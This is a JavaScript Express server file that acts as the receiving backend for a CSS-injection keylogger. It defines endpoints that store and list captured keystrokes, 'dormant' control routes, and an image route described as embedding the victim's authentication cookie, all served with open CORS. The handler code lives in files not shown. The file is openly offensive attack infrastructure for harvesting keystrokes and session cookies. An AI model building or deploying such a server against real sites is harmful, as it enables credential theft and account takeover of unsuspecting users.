const express = require("express");
const cookieParser = require("cookie-parser");
var cors = require("cors");

const cookieImageHandler = require("./routes/cookie-image");
const cssKeyLoggerAddKeyHandler = require("./routes/css-keylogger/addKey");
const cssKeyLoggerGetKeysHandler = require("./routes/css-keylogger/getKeys");
const cssKeyLoggerGetDormantHandler = require('./routes/css-keylogger/getDormant')
const cssKeyLoggerPostDormantHandler = require('./routes/css-keylogger/postDormant')

const app = express();
app.use(express.json());
app.use(cors());

app.use(cookieParser());
app.use("/static", express.static("public"));
const port = process.env.PORT || 8080;

app.get("/", (req, res) => {
  res.json({
    endpoints: {
      "/css-keylogger/add-key": "add keylogger stroke",
      "/css-keylogger/keys": "list of entered keys with css keylogger",
      "/image.png":
        "get a sample image containing the authentication cookie",
    },
  });
});

app.get("/image.png", cookieImageHandler);
app.get("/css-keylogger/add-key", cssKeyLoggerAddKeyHandler);
app.get("/css-keylogger/keys", cssKeyLoggerGetKeysHandler);
app.get("/css-keylogger/dormant", cssKeyLoggerGetDormantHandler);
app.post("/css-keylogger/dormant", cssKeyLoggerPostDormantHandler);

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`);
});
